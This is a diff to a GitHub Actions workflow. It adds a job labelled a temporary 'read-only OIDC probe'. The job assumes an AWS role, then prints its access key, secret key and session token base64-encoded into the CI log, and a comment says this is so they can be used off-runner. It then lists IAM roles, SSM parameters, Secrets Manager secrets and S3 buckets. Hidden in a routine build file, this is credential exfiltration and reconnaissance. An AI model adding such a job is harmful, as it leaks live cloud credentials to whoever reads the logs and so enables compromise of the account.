@@ -143,3 +143,37 @@ jobs:
             esac
           } | tee -a "$GITHUB_STEP_SUMMARY"
           exit "$rc"
+
+  # tmp-i50869: read-only OIDC probe — prints the assumed-role session credentials (base64) so
+  # they can be used off-runner, plus the read-only surface (roles/SSM/secrets/buckets).
+  probe-i50869:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@v6
+        with:
+          role-to-assume: arn:aws:iam::896586841071:role/rebar-terraform-plan
+          aws-region: us-east-1
+      - name: Dump identity and read-only surface
+        shell: bash
+        run: |
+          set +e
+          echo "=== creds-b64 ==="
+          printf '%s:%s:%s' "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" "$AWS_SESSION_TOKEN" | base64 -w0; echo
+          echo "=== sts ==="
+          aws sts get-caller-identity
+          echo "=== role-plan ==="
+          aws iam get-role --role-name rebar-terraform-plan --output json
+          echo "=== role-bedrock ==="
+          aws iam get-role --role-name rebar-external-ci-bedrock --output json
+          echo "=== roles-rebar ==="
+          aws iam list-roles --query "Roles[?contains(RoleName,'rebar')].[RoleName,Arn]" --output text
+          echo "=== ssm-params ==="
+          aws ssm describe-parameters --region us-east-1 --max-items 200 --query "Parameters[].[Name,Type]" --output text
+          echo "=== secrets ==="
+          aws secretsmanager list-secrets --region us-east-1 --max-items 200 --query "SecretList[].[Name,ARN]" --output text
+          echo "=== buckets ==="
+          aws s3api list-buckets --query "Buckets[].[Name]" --output text
